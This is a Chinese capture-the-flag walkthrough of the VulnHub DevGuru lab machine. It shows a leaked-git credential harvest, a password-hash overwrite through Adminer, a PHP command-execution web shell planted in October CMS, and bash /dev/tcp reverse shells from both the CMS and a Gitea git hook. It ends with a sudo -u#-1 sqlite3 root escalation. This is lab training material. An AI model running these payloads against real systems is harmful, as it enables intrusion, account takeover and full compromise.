# DevGuru

## 一、测试环境

DevGuru靶机、Mac攻击机、kali2020辅助攻击机

```text
VM名称：DEVGURU:1
下载：https://www.vulnhub.com/entry/devguru-1,620
目标：获得user.txt与root.txt并获得root权限
运行：VMware Workstation 16.x Pro（默认为NAT网络模式，VMware比VirtualBox更好地工作）
描述：DevGuru是一家虚构的web开发公司，雇用您进行pentest评估。您的任务是在他们的公司网站上查找漏洞并获取root。
```

_**靶机DevGuru**_

![image-20210305104431636](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305104431636.png)

![QQ20210305-0](https://gitee.com/Harveysn0w/mac-note_img/raw/master/QQ20210305-0.jpg)

## 二、信息收集

1.nmap扫描端口信息

![D76167BBD7BA7094E3A61116D26257F9](https://gitee.com/Harveysn0w/mac-note_img/raw/master/D76167BBD7BA7094E3A61116D26257F9.jpg)

2.我们看到了一个git信息泄露~提取泄露信息

![image-20210305111115003](https://gitee.com/Harveysn0w/mac-note_img/raw/master/C2D31AB88353934D9E7DC1FD32F8322E.jpg)

![image-20210305111337967](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305111337967.png)

提取完成。我们打开泄露信息文件夹~

![image-20210305111433148](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305111433148.png)

3.我们在config/database.php发现数据库密码信息

![image-20210305111610453](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305111610453.png)

```text
database：octoberdb
username：october
password：SQ66EBYx4GT3byXH
```

adminer.php文件是数据库配置功能页面，类似phpmyadmin

4.接下来我们登录adminer进入数据库

```text
http://192.168.0.111/adminer.php
```

![image-20210305112300310](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305112300310.png)

登录数据库，寻找铭感信息~

![image-20210305122041271](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305122041271.png)

我们看到了一个用户名 frank 但是密码是被加密过的~

```text
$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK
```

经分析得知~这个是MD5二次加密并加盐后的密码。

那么我们需要自行修改密码并加密。替换原有的密码即可。

```text
在线加密网站
https://bcrypt-generator.com/
```

![image-20210305135524213](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305135524213.png)

```text
$2y$10$8IvBT8bcqlSBzwzETS3EE.0FCKfGUHmjKKRyd65v8AOob9ow5yKbG
```

把密文替换~两个选项都需要哦：password和persist\_code两个字段，值都是上面123456加密加盐值，类型不选。保存即可

![image-20210305135624740](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305135624740.png)

PS：当然我们也可以新建一个用户，但是记得给管理员权限~

5.接下来我们扫描网站目录，寻找后台登录页面。

```text
dirsearch -u http://192.168.0.111/ -e *
```

![image-20210305135947558](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305135947558.png)

扫描完成后，测试一波，发现了登录页面~

```text
http://192.168.0.111/backend/backend/auth/signin
```

![image-20210305140021363](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305140021363.png)

5.登录后台~

```text
用户名：frank
密码：123456（刚刚修改的就是）
```

![435D8EED33C18C0EF39B0A9CC7417670](https://gitee.com/Harveysn0w/mac-note_img/raw/master/435D8EED33C18C0EF39B0A9CC7417670.jpg)

## 三、渗透测试之远程命令执行

1.仔细查询一番，发现可以在cms里面进行命令执行~

![image-20210305140456221](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305140456221.png)

2.在code中添加命令执行参数

```text
function onStart()
{
    $this->page["Harveysn0w"] = system($_GET['cmd']);
}
```

![image-20210305141943919](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305141943919.png)

在Markup添加一行进行调用

```text
{{ this.page.Harveysn0w }}
```

![image-20210305142038460](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305142038460.png)

点击首页进行访问~

![image-20210305142226325](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305142226325.png)

接下来，我们用GET请求，尝试命令执行

```text
http://192.168.0.111/?cmd=whoami
```

![image-20210305142334872](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305142334872.png)

命令执行成功！

PS：在命令存在空格时使用${IFS}绕过即可

![image-20210305142441118](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305142441118.png)

## 四、反弹shell

1.修改之前写入的命令执行参数，修改为反弹shell的命令

```text
function onStart()
{
    $this->page["Harveysn0w"] = system('bash -c \'exec bash -i &>/dev/tcp/192.168.0.102/4444 <&1\'');
}
```

![image-20210305142703158](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305142703158.png)

2.攻击机终端使用nc连接

```text
ncat -l 4444
```

输入完成后，重新访问首页，进行反弹~

![EF0762613693765C8F46A48E54C66B28](https://gitee.com/Harveysn0w/mac-note_img/raw/master/EF0762613693765C8F46A48E54C66B28.jpg)

```text
cd /var/backups
```

进入var，发现备份文件，仔细搜寻一番，发现有一个可疑的备份文件~

![image-20210305143133844](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305143133844.png)

我们把这个文件复制到html里面进行下载查看~

```text
cp app.ini.bak /var/www/html
```

![image-20210305143415285](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305143415285.png)

我们访问域名进行下载

```text
192.168.0.111/app.ini.bak
```

![image-20210305143609006](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305143609006.png)

打开搜寻一番，发现了另外一个数据库用户密码

![image-20210305143803489](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305143803489.png)

```text
DB_TYPE：mysql
HOST：127.0.0.1:3306
NAME：gitea
USER：gitea
PASSWD：UfFPTF8C8jjxVF2m
```

## 五、破解密码

打开：[http://192.168.0.111/adminer.php](http://192.168.0.111/adminer.php) 登录新的数据库

![image-20210305144100406](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305144100406.png)

我们再次看到了user，发现了一个新的加密方式~

![53D1E918F3F54B1B5F3F09935F099675](https://gitee.com/Harveysn0w/mac-note_img/raw/master/53D1E918F3F54B1B5F3F09935F099675.jpg)

修改frank用户密码为123456，需要知道密码加密方式。。

查找源码加密方式：[https://github.com/go-gitea/gitea/blob/master/models/user.go](https://github.com/go-gitea/gitea/blob/master/models/user.go)

加密参数有passwd,salt,algo

![image-20210305144502298](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305144502298.png)

按照switch语句判断应该执行

```text
tempPasswd = pbkdf2.Key([]byte(passwd), []byte(salt), 10000, 50, sha256.New)
```

修改一下脚本进行运行。

使用golang语言在线编译：[https://play.golang.org/](https://play.golang.org/)

```text
package main
import (
    "crypto/sha256"
    "golang.org/x/crypto/pbkdf2"
    "fmt"
)
func main(){
    var tempPasswd []byte
    tempPasswd = pbkdf2.Key([]byte("123456"),[]byte("Bop8nwtUiM"),10000,50,sha256.New)
    fmt.Println(fmt.Sprintf("%x",tempPasswd))
}
```

![image-20210305144714408](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305144714408.png)

得到密文：

```text
4f6289d97c8e4bb7d06390ee09320a272ae31b07363dbee078dea49e4881cdda50f886b52ed5a89578a0e42cca143775d8cb
```

也可以用python进行编译

```text
import hashlib, binascii

password = b"123456"
salt = b"Bop8nwtUiM"

dk = hashlib.pbkdf2_hmac("sha256", password, salt, 10000, dklen=50)
print(binascii.hexlify(dk))
```

修改密码：

![image-20210305144904064](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305144904064.png)

## 六、登录&获取shell

1.登录系统~

```text
URL：http://192.168.0.111:8585/
用户名：frank
密码：123456
```

![image-20210305145203376](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305145203376.png)

![B553250E55D054D729D1CE1413AA08D5](https://gitee.com/Harveysn0w/mac-note_img/raw/master/B553250E55D054D729D1CE1413AA08D5.jpg)

2.寻找地方写shell

找到个人仓库~

![image-20210305145532804](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305145532804.png)

点击setting

![image-20210305145550893](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305145550893.png)

找到Git Hooks

![image-20210305145605512](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305145605512.png)

点击最后一个的小画笔

![image-20210305145747028](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305145747028.png)

写入bash脚本

```text
bash -c 'exec bash -i &>/dev/tcp/192.168.0.102/5555 <&1'
```

![image-20210305145850090](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305145850090.png)

点击update hook进行保存，在终端监听5555端口

```text
ncat -l 5555
```

接下来，在CODE中选择一个文件进行修改并保存

![image-20210305151128601](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305151128601.png)

![image-20210305151145076](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305151145076.png)

Done！获得frank用户的shell

![image-20210305151212492](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305151212492.png)

使用python3升级shell功能

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20210305184006213](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305184006213.png)

## 七、获得user.txt

获得第一个flag：user.txt

```text
cd /home/frank
cat user.txt
```

![627BED4DAF5A2EAAAA1DE963F5B6500A](https://gitee.com/Harveysn0w/mac-note_img/raw/master/627BED4DAF5A2EAAAA1DE963F5B6500A.jpg)

```text
22854d0aec6ba776f9d35bf7b0e00217
```

## 八、提权

查看`sudo -l`，`crontab -l`，`id`等，此处可以利用suid提权

```text
sudo -l
```

![B39D3E6C-8263-4AA9-8D5D-CF9FEEB5A04F](https://gitee.com/Harveysn0w/mac-note_img/raw/master/B39D3E6C-8263-4AA9-8D5D-CF9FEEB5A04F.png)

sudo提权辅助网站：[https://gtfobins.github.io/gtfobins/sqlite3/](https://gtfobins.github.io/gtfobins/sqlite3/)

![image-20210305185209650](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305185209650.png)

![image-20210305185245458](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305185245458.png)

提权时候会让输入密码，使用sudo -u\#-1绕过限制进行执行

```text
sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'
```

![image-20210305185415125](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305185415125.png)

## 九、获得root.txt

进入root用户文件夹获得flag

```text
cd /root
cat root.txt
```

![image-20210305185640503](https://gitee.com/Harveysn0w/mac-note_img/raw/master/image-20210305185640503.png)

```text
96440606fb88aa7497cde5a8e68daf8f
```

## Done!

